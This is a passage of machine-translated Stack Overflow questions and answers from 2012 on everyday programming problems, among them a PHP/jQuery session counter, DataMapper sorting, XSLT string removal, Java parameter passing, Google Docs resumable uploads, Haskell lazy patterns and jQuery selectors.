CREATING QUESTIONS AND ANSWERS: ASSESSMENT 1 OF 4 
```

这显然是不正确的。

所以我的问题是，有谁知道为什么它没有把数字加起来？我知道 php 不是问题，因为我测试了我的代码，我发现如果没有 jquery`validation()`函数，那么代码可以正常工作，它会从 1 开始添加数字。

但是，如果我包含所需的 jquery`validation()`函数，那么它根本不会添加数字，而只会保持在 1。

任何人都可以帮助解决这个问题吗？

您可以在[这里](http://helios.hud.ac.uk/u0867587/Mobile_app/Text4.php)自己测试应用程序，只需按照以下步骤操作：

1.  当您在文本框中打开链接类型 5 并提交页面
2.  当您导航到下一页时，您会在顶部看到它的状态`CREATING QUESTIONS AND ANSWERS: ASSESSMENT 1 OF 5`。现在滚动到页面底部并单击“提交详细信息”按钮并确认确认框。
3.  您会看到标题仍然是状态`CREATING QUESTIONS AND ANSWERS: ASSESSMENT 1 OF 5`而不是`CREATING QUESTIONS AND ANSWERS: ASSESSMENT 2 OF 5`。

以下是相关代码，因此您知道代码是什么：

```
<?php

session_start();

if(isset($_POST['sessionNum'])){
            //Declare my counter for the first time

            $_SESSION['initial_count'] = $_POST['sessionNum'];
            $_SESSION['sessionNum'] = intval($_POST['sessionNum']);
            $_SESSION['sessionCount'] = 1;

    }

elseif (isset($_POST['submitDetails']) && $_SESSION['sessionCount'] < $_SESSION['sessionNum']) {
    $_SESSION['sessionCount']++;
}

$sessionMinus =  $_SESSION['sessionCount'];

if ($sessionMinus == $_SESSION['initial_count']){ 

    $action = 'create_session2.php'; 

}elseif($sessionMinus != $_SESSION['initial_count']){ 

    $action = $_SERVER['PHP_SELF']; 

}

?>

<script type="text/javascript">

function validation() {

    var _qid = "";
    var _msg = "";

    var alertValidation = "";
    // Note, this is just so it's declared...
    $("tr.optionAndAnswer").each(function() {

        _qid = $("td.qid",this).text();
        _msg = "You have errors on Question Number: " + _qid + "\n";

        $(".textAreaQuestion",this).each(function() {

            if (!this.value || this.value.length < 5) {
                alertValidation += "\n\u2022 You have not entered a valid Question\n";
            }

            if (alertValidation != "") {
                return false; //Stop the each loop 
            }
        });

               if(alertValidation != ""){
            return false;
        }

        });

    if (alertValidation != "") {
        alert(_msg + alertValidation);
        return false;
    }

    return true;

}

             function showConfirm(){

         var confirmMsg=confirm("Make sure that your details are correct, once you proceed after this stage you would not be able to go back and change any details towards Questions, Options and Answers for your Session." + "\n" + "\n" + "Are you sure you want to Proceed?" + "\n" );

         if (confirmMsg==true)
         {
         submitform();   
     }
}

         function submitform()
{
    var fieldvalue = $("#QandA").val();
    $.post("insertQuestion.php", $("#QandA").serialize() ,function(data){
        var QandAO = document.getElementById("QandA");
        QandAO.submit();
    });  
    alert("Your Details for this Session has been submitted"); 
}

</script>

</head>

<body>

<form id="QandA" action="<?php echo htmlentities($action); ?>" method="post">

<h1>CREATING QUESTIONS AND ANSWERS: ASSESSMENT <?php echo $sessionMinus ?> OF <?php echo $_SESSION['initial_count'] ?></h1>

<p><input id="submitBtn" name="submitDetails" type="submit" value="Submit Details" onClick="myClickHandler(); return false;" /></p>

</form>

         <script type="text/javascript">

function myClickHandler(){
     if(validation()){
                showConfirm();
     }
}

</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:50:20.637

提交后运行此代码：

```
if(isset($_POST['sessionNum'])){
  ...
  $_SESSION['sessionCount'] = 1;
}

$sessionMinus =  $_SESSION['sessionCount']; 
```

这显示在浏览器中：

```
<h1>
  CREATING QUESTIONS AND ANSWERS: ASSESSMENT 
  <?php $sessionMinus ?> OF <?php echo $_SESSION['initial_count'] ?>
</h1> 
```

$sessionMinus 的结果总是 1 ！！

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-14T17:46:39.460

我不认为这是一个有效的陈述：

`$_SESSION['sessionCount']++;`

我认为您需要像这样设置它：

`$_SESSION['sessionCount'] = $_SESSION['sessionCount'] + 1;`

# ruby-on-rails - Datamapper：通过关联对结果进行排序

> ID：12429429
> 
> 赞同：7
> 
> 时间：2012-09-14T17:42:23.220
> 
> 标签：ruby-on-rails, sorting, associations, datamapper

我正在开发一个使用 Datamapper 作为其 ORM 的 Rails 3.2 应用程序。我正在寻找一种通过关联模型的属性对结果集进行排序的方法。具体来说，我有以下模型：

```
class Vehicle
  include DataMapper::Resource

  belongs_to :user
end

class User
  include DataMapper::Resource

  has n, :vehicles
end 
```

现在我希望能够查询车辆并按驾驶员姓名对其进行排序。我尝试了以下方法，但似乎都不适用于 Datamapper：

```
> Vehicle.all( :order => 'users.name' )
ArgumentError: +options[:order]+ entry "users.name" does not map to a property in Vehicle

> Vehicle.all( :order => { :users => 'name' } )
ArgumentError: +options[:order]+ entry [:users, "name"] of an unsupported object Array 
```

现在我正在使用 Ruby 对查询后的结果集进行排序，但显然这对性能没有任何帮助，它也阻止了我进一步链接其他范围。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-27T14:09:31.370

我花了更多时间四处挖掘，终于找到了一个旧博客，它可以解决这个问题。它涉及在 DataMapper 中手动构建排序查询。

来自：[http ://rhnh.net/2010/12/01/ordering-by-a-field-in-a-join-model-with-datamapper](http://rhnh.net/2010/12/01/ordering-by-a-field-in-a-join-model-with-datamapper)

```
def self.ordered_by_vehicle_name direction = :asc
  order = DataMapper::Query::Direction.new(vehicle.name, direction)
  query = all.query
  query.instance_variable_set("@order", [order])
  query.instance_variable_set("@links", [relationships['vehicle'].inverse])
  all(query)
end 
```

这将让您通过关联进行排序并仍然链接其他范围，例如：

```
User.ordered_by_vehicle_name(:desc).all( :name => 'foo' ) 
```

这有点hacky，但它至少做了我想做的事情；）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-23T14:53:29.427

**注意：**我不熟悉 DataMapper，我的回答可能不在使用 DataMapper 的标准和建议范围内，但它应该有望为您提供您正在寻找的结果。

* * *

我一直在浏览各种 Google 搜索和 DataMapper 文档，但还没有找到“按关联属性排序”的方法。我想到的唯一解决方案是“原始”SQL。

查询看起来像这样。

```
SELECT vehicles.* FROM vehicles
LEFT JOIN users ON vehicles.user_id = users.id
ORDER BY users.name 
```

不幸的是，据我了解，当您直接查询数据库时，您不会获取`Vehicle`对象，而是从数据库中获取数据。

来自文档：[http](http://datamapper.org/docs/find.html) ://datamapper.org/docs/find.html 。*它位于标题为“直接与您的数据存储区对话”*的底部附近

 *> 请注意，这不会返回 Zoo 对象，而是直接来自数据库的原始数据

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-09-14T17:50:16.597

```
Vehicle.joins(:user).order('users.name').all 
```

或在 Rails 2.3 中，

```
Vehicle.all(:joins => "inner join users on vehicles.user_id = user.id", :order => 'users.name') 
```*

# iphone - 如何在 iPhone 应用程序中弹出日历？

> ID：12429434
> 
> 赞同：1
> 
> 时间：2012-09-14T17:42:50.643
> 
> 标签：iphone, objective-c, ios5

在我的 iPhone 应用程序中，我想在单击 UIButton 时打开一个日历，用户可以从中选择一个日期。我在谷歌上找不到太多材料。代码帮助将不胜感激。

在此先感谢 PC

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:50:09.480

我能找到的一些解决方案：

[OC日历](https://github.com/ocrickard/OCCalendar)

![在此处输入图像描述](../Images/0626e03db01924f371e7b081cff96732.png)

[PM日历](https://github.com/kovpas/PMCalendar)

![在此处输入图像描述](../Images/e446f331dc79761d9fd4a0e88b5be2f2.png)

[CK日历](https://github.com/jaykz52/CKCalendar)

![在此处输入图像描述](../Images/2a46dec35d8f96eef905b180bf52b919.png)

[卡尔](https://github.com/klazuka/Kal)

![在此处输入图像描述](../Images/9101abd75b5d4e2a617b60c29392bf2b.png)

[塔库](https://github.com/devinross/tapkulibrary)

![在此处输入图像描述](../Images/595c39e7f34649951078c68a9e3bd06a.png)

资料来源：[cocoacontrols.com](http://www.cocoacontrols.com/search?utf8=%E2%9C%93&q=calendar)

# xslt - 如何根据搜索多个节点值删除多个数字？

> ID：12429436
> 
> 赞同：2
> 
> 时间：2012-09-14T17:43:00.083
> 
> 标签：xslt, xslt-1.0

我对 XSLT 相当陌生，并且已经浏览了有关该主题的几篇文章，但似乎无法获得完成这项工作所需的最后一点。我正在尝试从我拥有的节点数据中出现的已知数据字符串中删除条目。我已经拼凑了一个适用于单个节点值但不适用于多个值的解决方案。

这是我的xml

```
<root>
<item>2</item>
<item>9</item>
<item>5</item>
</root> 
```

这是我适用于一个节点值的代码：

```
<xsl:template match="item">
<xsl:copy>
<xsl:call-template name="replaceChars">
<xsl:with-param name="original" select="string('1 2 3 4 5 6 7 8 9 10')"/>
</xsl:call-template>
</xsl:copy>
</xsl:template>
<xsl:template name="replaceChars">
<xsl:param name="original"/>
<xsl:choose>
<xsl:when test="contains($original, current())">
<xsl:value-of select="substring-before($original, current())"/>
<xsl:variable name="after" select="substring-after($original, current())"/>
<xsl:variable name="char" select="substring-before($after, current())"/>
<xsl:value-of select="concat($char, $after)"/>
<xsl:call-template name="replaceChars">
<xsl:with-param name="original" select="substring-after($after, current())"/>
</xsl:call-template>
</xsl:when>
<xsl:otherwise>
<xsl:value-of select="$original"/>
</xsl:otherwise>
</xsl:choose>
</xsl:template> 
```

我最新的测试我正在尝试使用它：

```
<xsl:template match="item">
<xsl:copy>
<xsl:call-template name="replaceChars">
<xsl:with-param name="original" select="string('1 2 3 4 5 6 7 8 9 10')"/>
</xsl:call-template>
</xsl:copy>
</xsl:template>
<xsl:template name="replaceChars">
<xsl:param name="original"/>
<xsl:choose>
<xsl:when test="contains($original, current())">
<xsl:variable name="before" select="substring-before($original, current())"/>
<xsl:variable name="after" select="substring-after($original, current())"/>
<xsl:variable name="char" select="substring-before($after, current())"/>
<xsl:variable name="new" select="concat($before, $after)"/>
<xsl:call-template name="replaceChars">
<xsl:with-param name="original" select="$new"/>
</xsl:call-template>
</xsl:when>
<xsl:otherwise>
<xsl:value-of select="$original"/>
</xsl:otherwise>
</xsl:choose>
</xsl:template> 
```

我继续在响应中迭代多次的值。我希望我的输出如下：

1 3 4 6 7 8 10

我已经对此进行了广泛的搜索，因为您可以看到我的示例是基于更改的搜索场景。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:23:40.813

你很近。

如果您想生成一次字符串“1 3 4 6 7 8 10”，那么您可能不希望您显示的代码对每个元素进行一次评估`item`，而是为每个元素评估一次`root`。

如果您希望递归模板`replaceChars`剔除`item`同级`item`元素集中每个元素的值，那么当前结构不会这样做。为什么？因为它敲出 的值，`current()`然后递归地调用自己*，而不做任何改变 的值`current()`*。

一种替代方法是说“我想构建一个由数字 1 组成的字符串（除非它出现在输入中），然后是数字 2（除非它出现在输入中），然后是 ...”并写（未测试）：

```
<xsl:template match="root">
  <survivors>
    <xsl:if test="not(./item = '1')">1 </xsl:if> 
    <xsl:if test="not(./item = '2')">2 </xsl:if> 
    <xsl:if test="not(./item = '3')">3 </xsl:if> 
    <xsl:if test="not(./item = '4')">4 </xsl:if> 
    <xsl:if test="not(./item = '5')">5 </xsl:if> 
    <xsl:if test="not(./item = '6')">6 </xsl:if> 
    <xsl:if test="not(./item = '7')">7 </xsl:if> 
    <xsl:if test="not(./item = '8')">8 </xsl:if> 
    <xsl:if test="not(./item = '9')">9 </xsl:if> 
  </survivors>
</xsl:template> 
```

或者如果你真的想做子字符串匹配的事情，你需要确保你的递归`replaceChars`实际上迭代了`item`元素：

```
<xsl:template match="root">
  <survivors>
    <xsl:call-template name="replaceChars2">
      <xsl:with-param name="s" select="'1 2 3 4 5 6 7 8 9'"/>
      <xsl:with-param name="item" select="./item[1]"/>
    </xsl:call-template>
  </survivors>
</xsl:template>

<xsl:template name="replaceChars2">
  <xsl:param name="s"/>
  <xsl:param name="item"/>
  <xsl:variable name="s2" select="string($item)"/>
  <xsl:choose>
    <xsl:when test="$item">
      <xsl:call-template name="replaceChars2">
        <xsl:with-param name="s" 
          select="concat(
            substring-before($s,$s2,
            ' ',
            substring-after($s,$s2,
            )"/>
        <xsl:with-param name="item" 
          select="./following-sibling::item[1]"/>
      </xsl:call-template>
    </xsl:when>
    <xsl:otherwise>
      <xsl:value-of select="$s"/>
    </xsl:otherwise>
  </xsl:choose>
</xsl:template> 
```

就像 OP 显示的代码一样，这假设没有`item`元素会意外匹配不应删除的字符串的任何部分（例如，如果任何项目将具有值 '1'，则原始字符串将永远不会具有像 '11' 这样的值）。

对于像这样的转换，迭代兄弟姐妹并传递参数以跟踪早期兄弟姐妹发生的事情的模式是一个重要的学习习惯。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-15T03:20:18.150

**这种转变**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:my="my:my">
 <xsl:output method="text"/>

 <my:sent/>
 <xsl:variable name="vSent" select="document('')/*/my:sent"/>

 <xsl:param name="pGiven" select="'1 2 3 4 5 6 7 8 9 10'"/>

 <xsl:template match="/*">
  <xsl:apply-templates select="item[1]"/>
 </xsl:template>

 <xsl:template match="item">
  <xsl:param name="pText" select="$pGiven"/>

  <xsl:apply-templates select=
   "following-sibling::item[1]|$vSent[not(current()/following-sibling::item)]">
    <xsl:with-param name="pText" select=
    "concat(substring-before(concat($pText, .), .),
            substring-after($pText,.)
            )
    "/>
   </xsl:apply-templates>
 </xsl:template>

 <xsl:template match="my:sent">
  <xsl:param name="pText"/>
  <xsl:value-of select="$pText"/>
 </xsl:template>
</xsl:stylesheet> 
```

**应用于提供的 XML 文档时：**

```
<root>
    <item>2</item>
    <item>9</item>
    <item>5</item>
</root> 
```

**产生想要的正确结果：**

```
1  3 4  6 7 8  10 
```

**请注意**：

1.  **整个转换**中没有 XSLT 条件指令**`xsl:choose`——不，不`xsl:when`，不，`xsl:otherwise`不`xsl:if`。**

***   **没有命名模板，也没有显式递归**（尽管`xsl:apply-templates`隐式递归）。

    *   **[Sentinel](http://en.wikipedia.org/wiki/Sentinel_value)编程**以两种不同的方式使用，以显着简化代码并提高效率。**

# javascript - 有哪些方法可以防止用户截取网页？

> ID：12429439
> 
> 赞同：16
> 
> 时间：2012-09-14T17:43:19.410
> 
> 标签：javascript, html, ajax, web, webpage

> **可能重复：**
> [如何防止我的网页出现打印屏幕？](https://stackoverflow.com/questions/7427286/how-do-i-prevent-from-printscreen-of-my-webpage)

我想阻止用户截取网页的屏幕截图。我必须在该 .html 文件中放置什么代码？

防止像打印屏幕一样按下按钮的代码应该是什么？因为许多网站阻止用户按任何键。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-14T17:46:45.217

屏幕截图不受 Web 浏览器控制，它们由运行在用户操作系统上的软件控制，不能由 Web 服务器远程控制。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-09-14T17:44:15.713

有可能的。试试这个 CSS 功能。

```
html {
    display: none;  /* hide whole page - the only true way to prevent screenshots */
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T17:49:10.843

纳尔逊是对的。你可以做很多事情来让它变得更难（javascript来捕捉prtsc按键并返回false，每隔一段时间闪烁屏幕的不同象限，这样人眼就无法真正分辨出来，但整个屏幕永远不会显示在一次，等等），但从根本上说，任何甚至是模糊技术的人都可以在大约 5 秒内绕过这个。此外，谷歌搜索应该会以比询问时间更短的方式为您回答这个问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-14T17:48:38.307

您无法阻止 Windows 7 中的打印屏幕按钮或截图工具或 Mac OS 随附的 Grab 应用程序或...

# maven - 将参数注入 Maven 配置文件

> ID：12429440
> 
> 赞同：0
> 
> 时间：2012-09-14T17:43:20.643
> 
> 标签：maven, maven-2

有谁知道是否可以将环境变量注入 mvn 命令。例如，我想在我的 jenkins 构建定义中执行以下操作：

```
mvn -e -P ${env.profile} clean install assembly:assembly 
```

我的 google foo 没有在 settings.xml 之外找到任何方法来执行此操作，即使这也不是我需要的动态。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T19:48:00.397

直接使用环境变量即可：

## Unix

```
mvn -e -P $profile clean install assembly:assembly 
```

## 视窗

```
mvn -e -P %profile% clean install assembly:assembly 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-15T06:41:28.923

这篇[文章](https://stackoverflow.com/questions/7144620/reading-properties-file-from-maven-pom-file)中的第二个答案应该对您有所帮助。它使用了`maven-antrun-plugin`

# java - 对象如何传递给java中的方法（通过值或通过引用）？

> ID：12429441
> 
> 赞同：1
> 
> 时间：2012-09-14T17:43:20.553
> 
> 标签：java

> **可能的重复：**
> [Java 是“按引用传递”吗？](https://stackoverflow.com/questions/40480/is-java-pass-by-reference)

我想知道如何通过java中的引用将对象作为参数传递给方法。我试过这段代码

```
public class Class1 
{
    public Class1()
    {
        String x = null;
        F(x);
        //x = null
        System.out.println("x = " + x);
    }

    void F(String x)
    {
        x = "new String";
    }

    public static void main(String[] args)
    {
        new Class1();
    }
} 
```

您可以看到我将 a 传递`String`给了函数 F，并在其中更改了 String 的值，但在函数 F 之外我看不到我对其所做的更改。当我执行此代码时，我得到`//{x = null}`的结果不是我所期望的`//{x = new String}`.

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-14T17:44:37.090

对象本身是通过引用传递的，但该*引用*是通过值传递的。

这意味着您可以更改函数中的对象，即您可以更改它们的字段，调用对象上更改其状态的方法等。

您正在尝试更改函数中的*引用*。该参考只是一个副本。

另请注意，这`String`是一个不可变类型。所以即使有它的参考，你也不能改变底层的`Object`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T17:54:15.200

Java 通过值而不是引用传递参数。有关数字解释，请参阅我[对另一个问题的回答](https://stackoverflow.com/a/9404727/597657)。

但是，您可以通过以下方式实现您想要做的事情：

**1-使用数组：**

```
public class Class1 
{
    public Class1()
    {
        String x = null;
        String[] holder = {x};
        F(holder);
        //x = null
        System.out.println("x = " + holder[0]);
    }

    void F(String[] holder)
    {
        holder[0] = "new String";
    }

    public static void main(String[] args)
    {
        new Class1();
    }
} 
```

**2-使用包装类：**

```
class WrapperClass
{
    public String value;
} 
```

```
public class Class1 
{
    public Class1()
    {
        String x = null;
        WrapperClass w = new WrapperClass();
        w.value = x;
        F(w);
        //x = null
        System.out.println("x = " + w.value);
    }

    void F(WrapperClass wrapper)
    {
        wrapper.value = "new String";
    }

    public static void main(String[] args)
    {
        new Class1();
    }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-14T18:03:56.820

Java 对象通过引用传递。意味着当您创建一个对象并将其分配给一个引用（变量）时，它的地址被分配给它。当您在被调用的函数中修改它时，它会修改传递的相同对象。但是在您的情况下，您已经传递了与任何对象无关的 null 。

请参阅我的示例以获得清晰的想法。

```
public class Class1 {
public Class1() {
    StringBuffer x = new StringBuffer("Before");
    F(x);
    // x = null
    System.out.println("x = " + x);
}

void F(StringBuffer x) {
    x.append("After");
}

public static void main(String[] args) {
    new Class1();
} 
```

}

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-14T21:04:44.683

从 Java 开始，字符串就是一种“特殊”的对象。它们确实存在于堆上，但为了节省内存和提高性能，JVM 将保留相同字符串的计数，并将所有引用指向具有相同值的位置。但要使其正常工作，内存中的字符串必须是不可变的（冻结，它们不能再更改）。

另一种方法是修改您的代码，以便您的函数返回更新后的值：

```
public class Class1 
{
    public Class1()
    {
        String x = null;
        x = F(x);
        //x = null
        System.out.println("x = " + x);
    }

    String F(String x)
    {
        return x = "new String";
    }

    public static void main(String[] args)
    {
        new Class1();
    }
} 
```

但也许你传递一个参数是有原因的，这只是为了说明你的方法如何返回一个新的字符串。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-14T18:35:05.493

你不能这样做，因为 sting 是不可变的，是不可改变的。你可以使用 StringBuffer 它是可变的。ok

```
class One
{
    One()
    {
        StringBuffer x =new StringBuffer("null");
        F(x);
        //x = null
        System.out.println("x = " + x);
    }

    void F(StringBuffer x)
    {
        x = x.delete(0,4);
        x=x.append("new string");   
    }

    public static void main(String[] args)
    {
        new One();
    }
} 
```

# ios - NSURLConnection 下载进度

> ID：12429445
> 
> 赞同：0
> 
> 时间：2012-09-14T17:43:39.680
> 
> 标签：ios, download, nsurlconnection, progress

我试图显示从 API 下载的进度，但 NSURLConnectionDelegate 在任何地方都没有总字节值。有没有办法在完成下载之前获取我正在下载的总字节数？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-14T18:03:04.453

`-expectedContentLength`您可以通过方法从 NSURLResponse 获取预期的内容长度。例如，如果您使用`NSURLConnection`并且`NSURLConnectionDelegate`可以在委托的 `connection:didReceiveResponse:`方法中获取该信息：

```
- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response
{
    ...
    long long contentLength = [response expectedContentLength];
    ...
} 
```

# php - Google 文档列表 API 308 简历不完整

> ID：12429447
> 
> 赞同：1
> 
> 时间：2012-09-14T17:43:53.700
> 
> 标签：php, rest, google-api

我正在使用 Google Document List API 上传文件和元数据。

只要文件小于 512KB，我就可以完美地工作。在 512KB 之后，我必须以 512KB 的块发送它。在每个块之后，我都会收到一个 308 的 HTTP 状态代码，这是正确的。

但是，在我发送了最终请求后，我仍然收到 308 响应，而不是我期望的 201 响应。以下是发送和接收的 HTTP 标头。也许其他人可以看到我所缺少的。

```
POST /feeds/upload/create-session/default/private/full HTTP/1.1
Host: docs.google.com
Accept: */*
Content-Type: application/atom+xml
Authorization: Bearer <CODE>
GData-Version: 3.0
Content-Type: application/atom+xml
X-Upload-Content-Length: 1436480
X-Upload-Content-Type: text/csv
Content-Length: 302

HTTP/1.1 200 OK
Server: HTTP Upload Server Built on Sep 5 2012 17:14:59 (1346890499)
Location: https://docs.google.com/feeds/upload/create-session/default/private/full?upload_id=<ID>
Date: Fri, 14 Sep 2012 17:34:50 GMT
Pragma: no-cache
Expires: Fri, 01 Jan 1990 00:00:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Content-Length: 0
Content-Type: text/html; charset=UTF-8

PUT /feeds/upload/create-session/default/private/full?upload_id=<ID> HTTP/1.1
Host: docs.google.com
Accept: */*
Authorization: Bearer <CODE>
GData-Version: 3.0
Content-Type: text/csv
Content-Range: bytes 0-524288/1436480
Content-Length: 524288
Expect: 100-continue

HTTP/1.1 308 Resume Incomplete
Server: HTTP Upload Server Built on Sep 5 2012 17:14:59 (1346890499)
Range: bytes=0-524287
X-Range-MD5: 8f470cff00adda7c22b8b34287d2cc1b
Date: Fri, 14 Sep 2012 17:34:52 GMT
Pragma: no-cache
Expires: Fri, 01 Jan 1990 00:00:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Content-Length: 0
Content-Type: text/html; charset=UTF-8

PUT /feeds/upload/create-session/default/private/full?upload_id=<ID> HTTP/1.1
Host: docs.google.com
Accept: */*
Authorization: Bearer <CODE>
GData-Version: 3.0
Content-Type: text/csv
Content-Range: bytes 524288-1048576/1436480
Content-Length: 524288
Expect: 100-continue

HTTP/1.1 308 Resume Incomplete
Server: HTTP Upload Server Built on Sep 5 2012 17:14:59 (1346890499)
Range: bytes=0-1048575
X-Range-MD5: 4af215a3ff92258bb1c8d05dc52cf77d
Date: Fri, 14 Sep 2012 17:34:54 GMT
Pragma: no-cache
Expires: Fri, 01 Jan 1990 00:00:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Content-Length: 0
Content-Type: text/html; charset=UTF-8

PUT /feeds/upload/create-session/default/private/full?upload_id=<ID> HTTP/1.1
Host: docs.google.com
Accept: */*
Authorization: Bearer <CODE>
GData-Version: 3.0
Content-Type: text/csv
Content-Length: 387904
Expect: 100-continue

HTTP/1.1 308 Resume Incomplete
Server: HTTP Upload Server Built on Sep 5 2012 17:14:59 (1346890499)
Range: bytes=0-1048575
X-Range-MD5: 4af215a3ff92258bb1c8d05dc52cf77d
Date: Fri, 14 Sep 2012 17:34:55 GMT
Pragma: no-cache
Expires: Fri, 01 Jan 1990 00:00:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Content-Length: 0
Content-Type: text/html; charset=UTF-8 
```

**编辑**

如果我在最后一个 PUT 请求上发送内容范围，这是最后一个标头。

```
PUT /feeds/upload/create-session/default/private/full?upload_id=<ID< HTTP/1.1
Host: docs.google.com
Accept: */*
Authorization: Bearer <CODE>
GData-Version: 3.0
Content-Type: text/csv
Content-Range: bytes 1048576-1436480/1436480
Content-Length: 387904
Expect: 100-continue

Got
HTTP/1.1 400 Bad Request
Server: HTTP Upload Server Built on Sep 5 2012 17:14:59 (1346890499)
Content-Type: text/html; charset=UTF-8
Date: Fri, 14 Sep 2012 19:12:06 GMT
Pragma: no-cache
Expires: Fri, 01 Jan 1990 00:00:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Content-Length: 15
Connection: close 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:07:39.477

您的最后一个请求似乎没有发送`Content-Range`. 我认为这是问题所在，但我不确定，因为我以前从未使用过这个 API。我只是脱离了我在 HTTP 规范中所知道的内容。

# haskell - Data.List 中的惰性模式匹配

> ID：12429449
> 
> 赞同：17
> 
> 时间：2012-09-14T17:43:55.400
> 
> 标签：haskell

在 Data.List 的分区中使用 ~（惰性模式匹配）有哪些性能优势。惰性模式匹配的人为示例表明，当元组构造函数中的值从不使用时（f (x,y) = 1），它很有用。在分区（select，下面）中，总是使用列表 ts、fs（如果应用于 x 的谓词 p 为 True，或不是）。我确信这是一个非常明智的决定使用〜，但有什么意义呢？为什么不严格模式匹配？

```
partition               :: (a -> Bool) -> [a] -> ([a],[a])
{-# INLINE partition #-}
partition p xs = foldr (select p) ([],[]) xs

select :: (a -> Bool) -> a -> ([a], [a]) -> ([a], [a])
select p x ~(ts,fs) | p x       = (x:ts,fs)
                    | otherwise = (ts, x:fs) 
```

（注意：我已经看过[这里](http://www.haskell.org/haskellwiki/Lazy_pattern_match)！它没有回答上述问题）

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-09-14T18:01:39.443

关键是，通过严格的模式匹配，结果的组装只能在到达要分区的列表末尾时开始，特别是`partition`对于无限列表根本不起作用。

对于严格的模式匹配，必须将参数评估为 WHNF。这意味着在决定是否放入第一个或第二个组件`foldr`之前，必须完成整个尾部。`x`

```
select p x (foldr (select p) ([],[]) (y:z:ws))
~> select p x (select p y (select p z (foldr (select p) ([],[]) ws))) 
```

使用惰性模式匹配时，立即构造一个对，`x`作为适当组件的第一个元素，两个列表的其余部分稍后在需要时进行评估。

# jquery - 无法访问使用 jquery 设置的文本框值

> ID：12429451
> 
> 赞同：-1
> 
> 时间：2012-09-14T17:44:04.997
> 
> 标签：jquery

我在 document.ready() 中使用 jquery 设置 taxtbox 值。单击按钮时，我试图将其值作为 txtbox1.Value() 访问，但我得到“”空字符串。但是，如果我使用警报消息，我会得到它的值 alert($('txtbox1').val())

请让我知道有什么问题。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:45:38.660

如果 txtbox1 是元素的 id，则使用 `alert($('#txtbox1').val())`

您可能想阅读有关[jQuery Selctors的文档](http://api.jquery.com/category/selectors/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:45:44.330

试试这个：`alert($('#txtbox1').val())`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T17:46:10.787

因为它应该是一个ID

`alert($('#txtbox1').val())` .. ID 应该以 # 开头

检查[小提琴](http://jsfiddle.net/sushanth009/gTyZw/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-14T17:46:52.463

如果文本框的 ID 为“txtbox1”，您应该这样做：

```
alert($('#txtbox1').val()) 
```

或者

```
alert($('.txtbox1').val()) 
```

如果该名称是文本框的类。

注意'#'和'.'，第一个用于选择id，第二个用于类。你需要那个。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-14T17:53:58.760

在我看来，您可能混淆了两种不同的获取元素值的方法。

**HTML**

```
<input id="txtbox1"></input>
<button id="button1">test</button>​ 
```

**JS**

```
​$(​"#button1").click(function(){
    alert($("#txtbox1").val());

    //or

    alert(document.getElementById("txtbox1").value);

});​ 
```

第一个选项使用 jQuery 语法获取文档引用，`$("#txtbox1")`然后使用 jQuery 函数[**`.val()`**](http://api.jquery.com/val/)获取输入的值。

第二个选项改为使用标准 javascript 通过 获取元素引用，`document.getElementById("txtbox1")`并使用`.value`.

**[例子](http://jsfiddle.net/YYM7J/)**

# c# - 从目录c#中的文件中读取特定行

> ID：12429456
> 
> 赞同：-3
> 
> 时间：2012-09-14T17:44:19.583
> 
> 标签：c#, .net

此代码工作正常，但我的问题是我需要读取包含 ESSD 的文件，如果此文件在某行中包含名称，请将其添加到我的 listbox1 中，如果它不包含该行中的名称，请不要将其添加到列表框 1。

谢谢。

```
private void button1_Click(object sender, EventArgs e)
    {
        DialogResult result = this.openFileDialog1.ShowDialog();
        if (result == DialogResult.OK)
        {
            string[] Nomarchivo = this.openFileDialog1.FileNames;
            string NomDirec = Path.GetDirectoryName(Nomarchivo[0]);
            for (int a = 0; a <= Nomarchivo.Length - 1; a++)
            {
                string NomDirGral = Nomarchivo[a].Remove(Nomarchivo[a].Length - 7, 7);
                string NomGral = NomDirGral.Replace(NomDirec, " ");
                NomGral = NomGral.Remove(0, 2);
                foreach (string f in Directory.GetFiles(NomDirec, NomGral + "*"))
                    this.listBox1.Items.Add(f);
                foreach (string h in Directory.GetFiles(NomDirec, "resume*"))
                    this.listBox1.Items.Add(h);
                foreach (string t in Directory.GetFiles(NomDirec, "ESSD1*"))
                    this.listBox1.Items.Add(t);
            }
            string[] list1 = new string[listBox1.Items.Count];
            for (int b = 0; b <= listBox1.Items.Count - 1; b++)
            {
                list1[b] = listBox1.Items[b].ToString();
            }
